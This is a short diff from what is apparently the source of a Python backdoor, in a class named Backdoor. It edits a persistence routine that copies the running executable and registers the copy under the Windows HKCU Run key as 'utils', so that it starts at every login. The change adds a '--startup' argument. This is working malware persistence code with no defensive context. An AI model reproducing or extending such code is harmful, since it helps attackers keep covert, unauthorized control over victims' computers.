@@ -238,7 +238,7 @@ class Backdoor:
                 shutil.copyfile(sys.executable, location)
                 subprocess.call(
                     'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v utils /t REG_SZ /d "'
-                    + location + '"',shell=True)
+                    + location + ' --startup' + '"', shell=True)
         except Exception as msg:
             print("Persistence failed" + str(msg))
 
